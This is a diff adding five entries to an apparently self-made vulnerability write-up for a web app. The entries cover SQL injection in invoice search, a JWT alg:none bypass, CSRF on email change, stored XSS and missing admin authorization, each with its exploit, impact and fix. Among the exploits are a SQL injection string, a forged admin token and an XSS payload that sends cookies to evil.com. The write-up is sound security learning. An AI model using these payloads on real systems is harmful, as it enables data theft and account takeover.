@@ -322,5 +322,140 @@ Rotate the session token on every successful login. Issue a new token after auth
 
 ---
 
-*Last updated: 2025*  
-*Author: [Cauã Alves](https://github.com/cauaalvs-dev)*
+---
+
+## 09 - SQL Injection via invoice search
+
+**OWASP**: A03:2021 Injection
+**Severity**: Critical
+**Route**: GET /api/invoices/search
+
+### How the flaw was introduced
+
+The invoice search endpoint concatenated the q parameter directly into a raw SQL string via $queryRawUnsafe.
+
+### How I exploited it
+
+    GET /api/invoices/search?q=' OR '1'='1
+
+The payload closes the status LIKE condition and appends OR 1=1, bypassing the userId filter and returning all invoices from all users.
+
+### Impact
+
+Full invoice exfiltration across all users. Any authenticated attacker can read every invoice regardless of ownership.
+
+### Fix
+
+Replaced $queryRawUnsafe with Prisma findMany, which uses parameterized queries internally.
+
+---
+
+## 10 - JWT none algorithm bypass
+
+**OWASP**: A07:2021 Identification and Authentication Failures
+**Severity**: Critical
+**Route**: POST /api/auth/verify-vuln
+
+### How the flaw was introduced
+
+The endpoint used jwt.decode() instead of jwt.verify(), accepting any algorithm including none and skipping signature validation.
+
+### How I exploited it
+
+Crafted a token with alg:none and arbitrary payload:
+
+    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbi1pZCIsInJvbGUiOiJhZG1pbiJ9.
+
+The server decoded it, trusted the payload, and returned admin user data.
+
+### Impact
+
+Full authentication bypass. Any attacker can impersonate any user including admins without knowing their credentials.
+
+### Fix
+
+    jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] })
+
+---
+
+## 11 - CSRF on email update
+
+**OWASP**: A01:2021 Broken Access Control
+**Severity**: Medium
+**Route**: POST /api/users/email
+
+### How the flaw was introduced
+
+The endpoint authenticated via cookie but did not validate the Origin header.
+
+### How I exploited it
+
+Hosted an auto-submitting form on an attacker-controlled domain. When a logged-in victim visits the page, their browser sends the request with their session cookie and changes their email to the attacker's.
+
+### Impact
+
+Account takeover via email change, enabling password reset and full account access.
+
+### Fix
+
+    const origin = req.headers.get('origin')
+    if (!ALLOWED_ORIGINS.includes(origin)) return 403
+
+---
+
+## 12 - Stored XSS in profile bio
+
+**OWASP**: A03:2021 Injection
+**Severity**: High
+**Route**: POST /api/users/bio
+
+### How the flaw was introduced
+
+The bio field stored raw HTML without sanitization and rendered it in the profile page.
+
+### How I exploited it
+
+Submitted as bio:
+
+    <script>fetch('https://evil.com?c='+document.cookie)</script>
+
+Any user viewing the profile executed the script, leaking their session cookie.
+
+### Impact
+
+Session hijacking. Attacker replays the stolen cookie to authenticate as the victim.
+
+### Fix
+
+    DOMPurify.sanitize(bio, { ALLOWED_TAGS: [] })
+
+---
+
+## 13 - Broken access control on admin route
+
+**OWASP**: A01:2021 Broken Access Control
+**Severity**: Critical
+**Route**: GET /api/admin/users
+
+### How the flaw was introduced
+
+The endpoint checked authentication but not authorization. Any logged-in user could list all users.
+
+### How I exploited it
+
+    GET /api/admin/users
+    Cookie: access_token=<regular-user-token>
+    -> 200 OK, returns all users with emails and roles
+
+### Impact
+
+Full user enumeration for any authenticated user. Enables targeted attacks against admin accounts.
+
+### Fix
+
+    if (role !== 'admin') return 403
+
+---
+
+*Last updated: June 2026*
+*Author: Caua Alves (https://github.com/cauaalvs-dev)*
